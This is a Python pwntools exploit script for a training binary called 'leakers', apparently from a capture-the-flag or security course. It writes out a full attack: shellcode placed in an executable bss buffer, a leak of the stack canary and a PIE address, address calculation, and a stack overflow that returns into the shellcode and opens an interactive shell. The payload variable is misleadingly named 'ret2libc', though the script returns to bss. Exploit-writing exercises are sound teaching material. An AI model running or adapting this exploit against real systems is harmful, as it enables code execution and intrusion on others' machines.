from pwn import *

import sys
sys.path.append('../../')
import pwnutil as util

#context.terminal = ['tmux', 'splitw', '-h']
# Connect to remote machine
#r = remote("training.jinblack.it", 2012)

r = process("./leakers") 

''' not attaching to remote

gdb.attach(r, """
	
        """)

'''

'''
EXPLANATION
- in main, mprotect is called: mprotect(&_GLOBAL_OFFSET_TABLE_,0x1000,7);
	- this is setting the memory from .got.plt up to + 0x1000 to writable, readable and executable (7)
	- since partial relro is active, the bss is after .got.plt, and since its setting 0x1000 bytes to wrx, this also covers the bss
- the program first reads into ps1 that is in bss (100 bytes)
	- we will send the shellcode here to place it in the bss since its executable
- then it loops reading 200 bytes into the stack
	- we will leak the canary and an eip address from which we can calculate the eip base and the bss address
	- then we execute the overflow overwriting the canary and returning to bss
'''

print(r.clean())
input("wait")

shellcode = util.nop_padding(20) + util.shellcode 

r.send(shellcode)
input("Shellcode sent, proceed to leak")

offset_to_canary = 8*13 #offset to the canary, which is the first data we leak

def pre_leak_consumer(max_returned_bytes, filler_size):
	r.recvuntil(b'> ')
	r.recv(filler_size)
	leak = r.recv(max_returned_bytes - filler_size, timeout=0.01)
	return leak

acc = util.leak_bytes(r, 200, offset_to_canary, pre_leak_consumer)

print("\nLeaked: ")
util.print_packed(acc, 8)
print("\n")


#Previously calculated offsets
pie_base_offset = -0xac0
bss_offset_from_pie_base = 0x201080 #offset from pie base to the ps1 buffer in bss

#In acc we have the leaked stuff
# <canary> <pie_address> 
# the pie address is an offset of the base

#get canary
canary = b'\0' + acc[1:8]

#get leaked pie_address and offset it to the base
pie_leak = u64(acc[8:16])
pie_base = pie_leak + pie_base_offset

bss_address = pie_base + bss_offset_from_pie_base
print("bss (ps1): " + hex(bss_address))
print("Canary: " + hex(u64(canary)))
print("pie base: " + hex(pie_base))
print("\n")

input("Leak done, proceed to exploit")

ret2libc = b'A' * offset_to_canary + canary + b'A' * 8 + p64(bss_address)
r.send(ret2libc)

r.clean()

r.interactive()
